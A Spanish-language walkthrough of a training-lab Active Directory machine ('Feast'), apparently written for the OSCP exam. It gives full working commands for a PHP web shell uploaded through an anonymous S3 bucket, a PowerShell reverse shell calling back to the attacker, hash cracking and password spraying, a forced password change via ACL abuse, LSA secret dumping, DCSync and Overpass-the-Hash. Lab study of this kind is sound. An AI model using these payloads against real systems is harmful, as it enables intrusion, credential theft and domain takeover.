# Máquina "Feast" (feast.com) — Writeup detallado (OSCP / lab AD)

**Objetivo:** comprometer todo el dominio `feast.com` (4 hosts).
**Atacante (Kali):** tun0 = `192.168.45.192`

Resumen de la cadena:
**S3 anónimo escribible → web shell vía CloudSync (SYSTEM en MS01) → creds MySQL en claro → crackeo de hashes md5 → cred de dominio (jeff) → BloodHound: ForceChangePassword sobre mario → mario es admin en MS02 → LSA secrets revela la contraseña del Administrador de dominio → Overpass-the-Hash → Domain Admin en el DC.**

Hosts:

| Host | IP | Rol |
|---|---|---|
| (Linux) | .168 | Almacenamiento **S3** (TwistedWeb) — backend de CloudSync |
| **DC01** | .169 | Domain Controller `feast.com` |
| **MS01** | .170 | App web **CloudSync** (Apache/PHP) + MySQL |
| **MS02** | .171 | Servidor Windows (SMB/WinRM) |

---

## 0. Conceptos base (explicado sencillo)

- **S3 / bucket:** un "disco en la nube" al que se habla por HTTP con la API de Amazon S3. Un bucket es una carpeta. Aquí el servidor de .168 imita S3 y **permite subir ficheros sin autenticación** (PUT anónimo). Eso es el fallo inicial.
- **CloudSync:** app web en MS01 que, al pulsar "Sync", **descarga lo que haya en el bucket S3 a una carpeta local** (`/storage/`) que además es servida por el servidor web. Si metemos un `.php` en el bucket y forzamos el sync, ese `.php` acaba ejecutándose en MS01.
- **Apache/PHP en Windows corre como SYSTEM:** por eso el web shell nos da directamente el máximo privilegio local.
- **Hash md5 de contraseña:** la app guarda `md5(password)`. Es débil y se **crackea** con un diccionario (hashcat `-m 0`).
- **BloodHound / ACL:** mapa de "quién puede hacer qué a quién" en el dominio. Buscamos **derechos sobre otros usuarios** (ej. *ForceChangePassword* = puedo cambiarle la contraseña a otro).
- **LSA secrets:** zona del registro de Windows donde se guardan secretos de servicios. Si un servicio corre con una cuenta de dominio, **su contraseña queda ahí en claro**. Oro puro.
- **Overpass-the-Hash (OPtH):** usar el **hash NT** de una cuenta (en vez de su contraseña) para pedir un **ticket Kerberos (TGT)** y autenticarte como esa cuenta.

---

## 1. Enumeración

```bash
# puertos (por host)
sudo nmap -p- --min-rate=5000 -Pn -v <IP> -oN allports.txt
sudo nmap -p<abiertos> -sCV -Pn <IP> -oN detailed.txt

# descubrimiento rápido del dominio
nxc smb 192.168.141.0/24
```

Lo relevante:
- **.168**: SSH + `TwistedWeb` en :80 → resulta ser un **servidor S3**.
- **.170 (MS01)**: Apache/PHP con la web **"CloudSync"** + MySQL (3306).
- **.169 (DC01)**, **.171 (MS02)**: Windows del dominio `feast.com`.

Añade al `/etc/hosts`:
```
192.168.141.169 DC01.feast.com feast.com DC01
192.168.141.170 MS01.feast.com MS01
192.168.141.171 MS02.feast.com MS02
```

---

## 2. Foothold: web shell vía CloudSync → SYSTEM en MS01

### 2.1 El bucket S3 de .168 (lectura y escritura anónimas)

```bash
# listar el bucket
curl -s http://192.168.141.168/storage ; echo
```
Devuelve un `ListBucketResult` (XML de S3) con unos CSV. **Probar escritura (PUT):**
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -s -X PUT "http://192.168.141.168/storage/shell.php" --data-binary @shell.php -i
# HTTP/1.1 200 OK  -> escritura anónima permitida
```
> Los CSV (`users-info.csv`, etc.) dan **nombres de usuarios** del dominio, pero no contraseñas.

### 2.2 Entrar en CloudSync (MS01)

La web tiene `login.php`. **El SQLi no funciona** (usa consultas preparadas) y las contraseñas no se adivinan... hasta que recuerdas que **el lab te da unas credenciales para MS01**: `Eric.Wallows : EricLikesRunning800`.

> **Lección #1 (la que destrabó todo):** esas creds **fallaban por SMB** contra el dominio, pero `login.php` valida contra **MySQL local**, no contra el dominio. Credencial de app ≠ credencial de dominio → **siempre prueba las creds también en las webs**.

```bash
curl -s -i -c cookies.txt http://192.168.141.170/login.php \
  --data-urlencode "username=Eric.Wallows" --data-urlencode "password=EricLikesRunning800"
# HTTP/1.1 302 Found   location: sync.php   -> login OK, cookie guardada
```

### 2.3 Disparar el sync y ejecutar

`sync.php` es un formulario con un botón "Sync Files" (POST sin parámetros) que baja el bucket a `/storage/`.

```bash
# 1) (re)subir el shell al bucket
curl -s -X PUT "http://192.168.141.168/storage/shell.php" --data-binary @shell.php -o /dev/null
# 2) disparar el sync autenticado
curl -s -b cookies.txt -X POST http://192.168.141.170/sync.php -o /dev/null
# 3) ejecutar
curl -s "http://192.168.141.170/storage/shell.php?cmd=whoami"
# nt authority\system
```

> **Por qué no funcionaba "solo esperar":** `/storage/` estaba vacío porque **el sync NO es automático**; hay que dispararlo autenticado con `sync.php`. Sin login válido, no hay sync.

### 2.4 Reverse shell (opcional pero cómodo)

```bash
# listener
rlwrap nc -lvnp 443

# payload PowerShell en base64, lanzado por el webshell
IP=192.168.45.192
PS='$c=New-Object System.Net.Sockets.TCPClient("'$IP'",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}'
B64=$(echo -n "$PS" | iconv -t UTF-16LE | base64 -w0)
curl -s "http://192.168.141.170/storage/shell.php?cmd=powershell%20-enc%20$B64"
```

✅ **Objetivo 1 completado: web shell → SYSTEM en MS01.**

---

## 3. Credenciales MySQL → movimiento lateral

`login.php` nos muestra la conexión a BD (leyendo el fuente con el webshell):
```bash
curl -s "http://192.168.141.170/storage/shell.php?cmd=type+C:\xampp\htdocs\login.php"
# $db = new mysqli('localhost', 'root', '', 'cloudsync');   -> root SIN contraseña
```

Volcar la tabla de usuarios (ejecutando el `mysql.exe` de XAMPP):
```powershell
C:\xampp\mysql\bin\mysql.exe -u root -e "SELECT * FROM cloudsync.users;"
```
Salen 7 usuarios con `md5(password)`.

Crackear con hashcat:
```bash
# fichero user:hash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --username
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --username --show
```
Resultado (6/7):
```
john.doe:anthony   jane.smith:abc123   bob.johnson:butterfly
jeff.borrows:naruto   alice.williams:andrew   charlie.brown:tweety
```

**Probar cuáles valen en el dominio (spray):**
```bash
# empareja user<->pass por línea con --no-bruteforce
nxc smb 192.168.141.169 -u dom_users.txt -p dom_pass.txt --no-bruteforce --continue-on-success
# [+] feast.com\jeff.borrows:naruto    <- la única válida en el dominio
```

> **Truco de spray:** no uses "hay Set-Cookie" como señal de éxito (aparece siempre). Para una web, mide el **tamaño de la respuesta** (fallo = tamaño fijo) o busca un `Location:`.

✅ **Objetivo 2 completado: creds MySQL → cred de dominio (jeff.borrows).**

---

## 4. BloodHound: abuso de ACL (jeff → mario)

Recolectar como jeff (no uses el módulo `--bloodhound` de nxc si da el error de paquete CE; usa el colector dedicado):
```bash
bloodhound-python -u jeff.borrows -p naruto -d feast.com -ns 192.168.141.169 -c All --zip
```
Sube el `.zip` a la GUI, marca `JEFF.BORROWS@FEAST.COM` como **Owned** y mira su **Outbound Object Control**:

- **jeff → `ForceChangePassword` → mario.lemieux**

> **Lección #2 (dirección de las aristas):** en BloodHound, "Inbound Object Control" = *quién me controla a mí* (los admins controlan a todos, es trivial). Lo útil es **"Outbound Object Control"** = *a quién controlo yo*. Confundirlos te hace perder tiempo.

**Abusar del ForceChangePassword** (cambiar la contraseña de mario). Ojo con el `!` en bash:
```bash
set +H   # desactiva la expansión de historial (! rompía el comando)
bloodyAD --host 192.168.141.169 -d feast.com -u jeff.borrows -p naruto \
  set password mario.lemieux 'Fall2026Pass#99'
# verificar
nxc smb 192.168.141.169 -u mario.lemieux -p 'Fall2026Pass#99'   # [+]
```

mario no tiene control saliente sobre grupos privilegiados (solo es Domain Users). **Su valor es poder autenticarte como él** y ver a qué da acceso:
```bash
nxc smb   192.168.141.169 192.168.141.170 192.168.141.171 -u mario.lemieux -p 'Fall2026Pass#99'
nxc winrm 192.168.141.169 192.168.141.170 192.168.141.171 -u mario.lemieux -p 'Fall2026Pass#99'
# -> mario es ADMIN LOCAL + WinRM en MS02 (.171)  (Pwn3d!)
```

✅ **Objetivo 3 completado: ACL abuse (ForceChangePassword) → control de mario.**

---

## 5. MS02 → LSA secrets → contraseña del Administrador de dominio

mario es admin en MS02, así que volcamos credenciales de esa máquina:
```bash
evil-winrm -i 192.168.141.171 -u mario.lemieux -p 'Fall2026Pass#99'   # shell
# volcado de secretos (SAM + LSA):
nxc smb 192.168.141.171 -u mario.lemieux -p 'Fall2026Pass#99' --sam --lsa
secretsdump.py feast.com/mario.lemieux:'Fall2026Pass#99'@192.168.141.171
```
En los **LSA secrets** aparece un servicio que corre como el Administrador de dominio, con la contraseña **en claro**:
```
_SC_SNMPTRAP
feast\administrator:BigFeast999!
```

> **Lección #3:** los secretos `_SC_<servicio>` guardan la contraseña **en texto plano** de la cuenta que ejecuta ese servicio. Si un servicio corre como una cuenta de dominio privilegiada, acabas de ganar.

Confirmar que es Domain Admin:
```bash
nxc smb 192.168.141.169 -u administrator -p 'BigFeast999!'   # (Pwn3d!)
```

---

## 6. Overpass-the-Hash → Domain Admin en el DC

Sacar el **NT hash** del Administrador (por DCSync, ya como DA) y usarlo para pedir un TGT:
```bash
# NT hash del admin de dominio
secretsdump.py feast.com/administrator:'BigFeast999!'@DC01.feast.com -just-dc-user 'FEAST\Administrator'
# Administrator:500:...:6ab12784a390f4a54f0e240463587725:::

# Kerberos es sensible a la hora -> sincroniza con el DC
sudo ntpdate 192.168.141.169   # o: sudo rdate -n 192.168.141.169

# OPtH: hash -> TGT Kerberos
getTGT.py feast.com/Administrator -hashes :6ab12784a390f4a54f0e240463587725 -dc-ip 192.168.141.169
export KRB5CCNAME=Administrator.ccache
nxc smb DC01.feast.com --use-kcache     # verifica el ticket (Pwn3d!)
```

Shell de Domain Admin en el DC (con el hash o el ticket):
```bash
evil-winrm -i DC01.feast.com -u Administrator -H 6ab12784a390f4a54f0e240463587725
#  whoami ; type C:\Users\Administrator\Desktop\proof.txt

# o con Kerberos:
#  psexec.py -k -no-pass DC01.feast.com
```

Compromiso total (volcar toda la NTDS, krbtgt incluido):
```bash
secretsdump.py feast.com/administrator:'BigFeast999!'@DC01.feast.com -just-dc
```

✅ **Objetivos 4 y 5 completados: Overpass-the-Hash → Domain Admin → dominio comprometido.**

---

## 7. Flags

- **DC01 (.169):** `C:\Users\Administrator\Desktop\proof.txt` (como DA).
- **MS01 (.170):** SYSTEM (webshell/revshell) →
  ```bash
  curl -s "http://192.168.141.170/storage/shell.php?cmd=powershell+Get-Content+C:\Users\Administrator\Desktop\proof.txt"
  ```
- **MS02 (.171):** evil-winrm como mario (admin) →
  ```powershell
  Get-ChildItem C:\Users\*\Desktop\*.txt -Force | % { $_.FullName; Get-Content $_.FullName }
  ```

---

## 8. Chuleta rápida

```bash
# 1) S3 anónimo -> subir webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -s -X PUT http://192.168.141.168/storage/shell.php --data-binary @shell.php

# 2) login CloudSync (creds del lab, valen en la WEB aunque fallen en SMB)
curl -s -i -c cookies.txt http://192.168.141.170/login.php \
  --data-urlencode "username=Eric.Wallows" --data-urlencode "password=EricLikesRunning800"
# 3) disparar sync + RCE (SYSTEM)
curl -s -b cookies.txt -X POST http://192.168.141.170/sync.php
curl -s "http://192.168.141.170/storage/shell.php?cmd=whoami"

# 4) creds MySQL -> dump -> crackear -> spray
#    mysql root sin pass ; hashcat -m 0 ; nxc smb ... --no-bruteforce  -> jeff.borrows:naruto

# 5) BloodHound: jeff --ForceChangePassword--> mario
set +H
bloodyAD --host 192.168.141.169 -d feast.com -u jeff.borrows -p naruto set password mario.lemieux 'Fall2026Pass#99'

# 6) mario = admin en MS02 -> LSA -> feast\administrator:BigFeast999!
nxc smb 192.168.141.171 -u mario.lemieux -p 'Fall2026Pass#99' --sam --lsa

# 7) Overpass-the-Hash -> DA en el DC
secretsdump.py feast.com/administrator:'BigFeast999!'@DC01.feast.com -just-dc-user 'FEAST\Administrator'
getTGT.py feast.com/Administrator -hashes :<NT_HASH> -dc-ip 192.168.141.169
export KRB5CCNAME=Administrator.ccache
evil-winrm -i DC01.feast.com -u Administrator -H <NT_HASH>
```

---

## 9. Lecciones clave (para el examen)

1. **Credencial de app ≠ credencial de dominio.** Si unas creds fallan por SMB/WinRM, **pruébalas en cada web** (logins que validan contra BD local). Esto fue lo que destrabó Feast.
2. **S3 con escritura anónima** = subida de ficheros arbitraria. Combínalo con cualquier proceso que "sincronice" el bucket a un sitio ejecutable (webroot) → RCE.
3. **Apache/PHP en Windows = SYSTEM.** Un `.php` subido te da el máximo local directo.
4. **Hashes md5 de apps** se crackean en segundos (`hashcat -m 0`). Luego **reutiliza** (password spraying) contra el dominio.
5. **BloodHound: mira el control SALIENTE** (Outbound Object Control). `ForceChangePassword` sobre otro usuario = te apropias de su cuenta con `bloodyAD set password`.
6. **No todo salto es "hacia arriba por ACL":** a veces un usuario solo sirve para **autenticarte** y descubrir que es **admin local en otra máquina**. Siempre haz `nxc smb/winrm` con cada cred nueva contra todos los hosts.
7. **LSA secrets (`_SC_<servicio>`)** guardan contraseñas en claro de cuentas de servicio. Si el servicio corre como una cuenta privilegiada → game over. (`nxc --lsa`, `secretsdump`.)
8. **Overpass-the-Hash:** `getTGT.py -hashes :<NT>` → `KRB5CCNAME` → autenticación Kerberos. **Sincroniza la hora** con el DC o fallará.
9. **Detalles de shell que cuestan tiempo:** el `!` en bash (`set +H` o comillas simples), apuntar al DC por **FQDN** para evitar `BAD_DN` en secretsdump, y usar el **colector de BloodHound correcto** (CE vs legacy).
